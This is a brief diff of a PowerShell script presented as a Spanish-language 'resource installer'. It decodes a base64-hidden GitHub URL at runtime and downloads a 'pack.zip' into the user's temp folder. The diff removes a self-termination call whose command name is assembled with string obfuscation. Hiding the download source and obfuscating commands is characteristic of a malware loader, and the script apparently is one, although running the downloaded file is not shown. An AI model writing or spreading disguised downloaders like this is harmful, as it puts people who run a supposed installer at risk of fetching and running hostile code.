@@ -5,7 +5,6 @@ $Host.UI.RawUI.WindowTitle = " Instalador de Recursos"
 $e = "aHR0cHM6Ly9naXRodWIuY29tL1QtcmV4MjEvbGlzZW5jZS9yZWxlYXNlcy9kb3dubG9hZC92MS4wLjAvcGFjay56aXA="
 $LuasUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e))
 Invoke-WebRequest $LuasUrl -OutFile "$env:TEMP\pack.zip"
-&("{1}{0}" -f "ess","Proc") ("Sto"+"p-") -Id $PID -Force
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 chcp 65001 > $null
 
